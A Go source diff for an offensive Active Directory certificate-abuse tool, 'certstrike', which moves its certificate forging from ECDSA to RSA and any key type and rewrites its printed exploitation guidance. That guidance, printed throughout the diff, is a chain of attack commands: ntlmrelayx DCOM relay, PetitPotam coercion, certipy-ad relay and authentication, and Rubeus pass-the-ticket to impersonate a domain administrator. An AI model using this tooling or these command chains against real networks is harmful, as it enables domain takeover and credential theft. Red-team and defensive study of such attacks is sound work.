@@ -1,9 +1,9 @@
 package main
 
 import (
-	"crypto/ecdsa"
-	"crypto/elliptic"
+	"crypto"
 	"crypto/rand"
+	"crypto/rsa"
 	"crypto/x509"
 	"encoding/json"
 	"encoding/pem"
@@ -234,7 +234,7 @@ func runEnumerate(cmd *cobra.Command) error {
 			if len(f.Templates) > 0 {
 				fmt.Printf("    Templates: %s\n", strings.Join(f.Templates, ", "))
 			}
-			fmt.Printf("    Exploit:   certstrike pki --esc 6 --template <ANY_TEMPLATE> --upn administrator@%s --target-dc %s --domain %s\n", cfg.Domain, cfg.TargetDC, cfg.Domain)
+			fmt.Printf("    Exploit:   certstrike pki --esc 6 --template <ANY_TEMPLATE> --upn administrator@%s --target-dc %s --domain %s -u <user> -p <pass>\n", cfg.Domain, cfg.TargetDC, cfg.Domain)
 			fmt.Println()
 		}
 	}
@@ -312,7 +312,7 @@ func runEnumerate(cmd *cobra.Command) error {
 			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
 			fmt.Printf("    DCOM:      %v\n", f.DCOMAccessible)
 			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
-			fmt.Printf("    Exploit:   certstrike pki --esc 12 --template <TEMPLATE> --upn administrator@%s --target-dc %s --domain %s\n", cfg.Domain, cfg.TargetDC, cfg.Domain)
+			fmt.Printf("    Exploit:   ntlmrelayx.py -t dcom://%s -dcom-mode ICPR -icpr-ca-name %q -smb2support --template <TEMPLATE>\n", f.CAHostname, f.CAName)
 			fmt.Println()
 		}
 	}
@@ -478,7 +478,7 @@ func runForge(cmd *cobra.Command) error {
 	}
 
 	// Self-signed mode: original ForgeCertificate behavior
-	var caKey *ecdsa.PrivateKey
+	var caKey crypto.PrivateKey
 
 	if caKeyPath != "" {
 		data, err := os.ReadFile(caKeyPath)
@@ -489,27 +489,31 @@ func runForge(cmd *cobra.Command) error {
 		if block == nil {
 			return fmt.Errorf("no PEM block found in %s", caKeyPath)
 		}
-		key, err := x509.ParseECPrivateKey(block.Bytes)
-		if err != nil {
-			pkcs8Key, err2 := x509.ParsePKCS8PrivateKey(block.Bytes)
-			if err2 != nil {
-				return fmt.Errorf("parse CA key: %w (also tried PKCS8: %v)", err, err2)
-			}
-			ecKey, ok := pkcs8Key.(*ecdsa.PrivateKey)
-			if !ok {
-				return fmt.Errorf("CA key is not ECDSA")
-			}
-			caKey = ecKey
+		// Try PKCS8 first (handles RSA, ECDSA, Ed25519), then legacy formats
+		pkcs8Key, err := x509.ParsePKCS8PrivateKey(block.Bytes)
+		if err == nil {
+			caKey = pkcs8Key
 		} else {
-			caKey = key
+			// Try PKCS1 RSA
+			rsaKey, rsaErr := x509.ParsePKCS1PrivateKey(block.Bytes)
+			if rsaErr == nil {
+				caKey = rsaKey
+			} else {
+				// Try EC
+				ecKey, ecErr := x509.ParseECPrivateKey(block.Bytes)
+				if ecErr != nil {
+					return fmt.Errorf("parse CA key: PKCS8: %v, PKCS1: %v, EC: %v", err, rsaErr, ecErr)
+				}
+				caKey = ecKey
+			}
 		}
 	} else {
-		fmt.Println("[*] No --ca-key provided, generating ephemeral CA key...")
-		var err error
-		caKey, err = ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+		fmt.Println("[*] No --ca-key provided, generating ephemeral RSA key...")
+		rsaKey, err := rsa.GenerateKey(rand.Reader, 2048)
 		if err != nil {
 			return fmt.Errorf("generate CA key: %w", err)
 		}
+		caKey = rsaKey
 	}
 
 	cert, certKey, err := pki.ForgeCertificate(caKey, upn)
@@ -569,7 +573,7 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 	}
 
 	var cert *x509.Certificate
-	var certKey *ecdsa.PrivateKey
+	var certKey crypto.Signer
 	var err error
 
 	switch escID {
@@ -632,7 +636,7 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 			fmt.Printf("[*] Or manually: PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
 		}
 		fmt.Println("\n[*] After obtaining the certificate via relay:")
-		fmt.Printf("    certipy auth -pfx <cert.pfx> -dc-ip %s\n", cfg.TargetDC)
+		fmt.Printf("    certipy-ad auth -pfx <cert.pfx> -dc-ip <DC_IP> -domain %s\n", cfg.Domain)
 		return nil
 	case "12":
 		// ESC12 is a DCOM-based attack — scan for accessible DCOM endpoints and print the relay command
@@ -651,7 +655,7 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 			fmt.Printf("    # Then coerce auth: PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
 		}
 		fmt.Println("\n[*] After obtaining the certificate via DCOM relay:")
-		fmt.Printf("    certipy auth -pfx <cert.pfx> -dc-ip %s\n", cfg.TargetDC)
+		fmt.Printf("    certipy-ad auth -pfx <cert.pfx> -dc-ip <DC_IP> -domain %s\n", cfg.Domain)
 		return nil
 	case "5":
 		// ESC5 is a CA-level ACL finding — scan for vulnerable PKI object ACLs
@@ -713,7 +717,7 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 			fmt.Printf("    Flags: 0x%x\n", f.Flags)
 		}
 		fmt.Println("\n[*] RPC enrollment without encryption allows relay attacks via ICertPassage:")
-		fmt.Printf("    certipy relay -target rpc://<CA_HOST> -template %s\n", templateName)
+		fmt.Printf("    certipy-ad relay -target rpc://<CA_HOST> -template %s\n", templateName)
 		fmt.Printf("    # Then coerce auth: PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
 		return nil
 	case "14":
@@ -796,7 +800,7 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 	fmt.Printf("    Files:    %s.crt / %s.key / %s.pfx\n", basePath, basePath, basePath)
 	if !selfSigned {
 		fmt.Printf("\n[*] Authenticate with the certificate:\n")
-		fmt.Printf("    certipy-ad auth -pfx %s -dc-ip %s -domain %s\n", pfxPath, cfg.TargetDC, cfg.Domain)
+		fmt.Printf("    certipy-ad auth -pfx %s -dc-ip <DC_IP> -domain %s\n", pfxPath, cfg.Domain)
 		fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s /ptt\n", upn, pfxPath)
 	}
 	return nil
